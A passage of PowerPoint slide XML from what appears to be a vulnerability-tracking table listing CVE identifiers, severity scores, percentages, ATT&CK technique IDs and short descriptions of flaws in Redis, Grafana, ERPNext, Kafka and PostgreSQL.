          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>89.1%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="TextBox 63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898648" y="4050792"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>YES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="TextBox 64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="4050792"/>
            <a:ext cx="1691640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1213 · T1059</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="TextBox 65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184648" y="4050792"/>
            <a:ext cx="4800600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Redis 6.0 Lua eval sandbox escape — CVE affects Debian/Ubuntu packages</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="TextBox 66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10076688" y="4050792"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Redis Tracking 6.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Rectangle 67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4261104"/>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92608" y="4297680"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2021-43798</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1709928" y="4297680"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>7.5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="4297680"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>63.4%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="TextBox 71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898648" y="4297680"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>YES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="TextBox 72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="4297680"/>
            <a:ext cx="1691640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1552</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="TextBox 73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184648" y="4297680"/>
            <a:ext cx="4800600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Grafana 8.x path traversal reads files outside webroot via plugin path</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10076688" y="4297680"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Grafana 8.2.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Rectangle 75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4507992"/>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92608" y="4544568"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2023-46127</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="TextBox 77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1709928" y="4544568"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8.8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="4544568"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>41.2%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898648" y="4544568"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="TextBox 80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="4544568"/>
            <a:ext cx="1691640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1059.006</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="TextBox 81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184648" y="4544568"/>
            <a:ext cx="4800600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ERPNext stored XSS via item description field with default credential exposure</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="TextBox 82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10076688" y="4544568"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ERPNext 14.x</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="Rectangle 83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4754880"/>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92608" y="4791456"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2023-25194</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="TextBox 85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1709928" y="4791456"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8.8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="TextBox 86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="4791456"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>28.5%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="TextBox 87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898648" y="4791456"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="TextBox 88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="4791456"/>
            <a:ext cx="1691640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1203 · T1048</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="TextBox 89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184648" y="4791456"/>
            <a:ext cx="4800600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Apache Kafka Connect JDBC JNDI injection via SASL JAAS config</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="TextBox 90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10076688" y="4791456"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Apache Kafka 3.1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Rectangle 91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5001768"/>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92608" y="5038344"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2024-0985</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="TextBox 93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1709928" y="5038344"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="TextBox 94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="5038344"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>15.3%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="TextBox 95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898648" y="5038344"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="TextBox 96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="5038344"/>
            <a:ext cx="1691640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1611</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="TextBox 97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184648" y="5038344"/>
            <a:ext cx="4800600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PostgreSQL SQL SECURITY DEFINER function flaw allows priv-esc to superuser</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="TextBox 98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10076688" y="5038344"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PostgreSQL 14</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="Rectangle 99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5248656"/>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92608" y="5285232"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2019-3826</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="TextBox 101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1709928" y="5285232"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6.1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="TextBox 102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="5285232"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
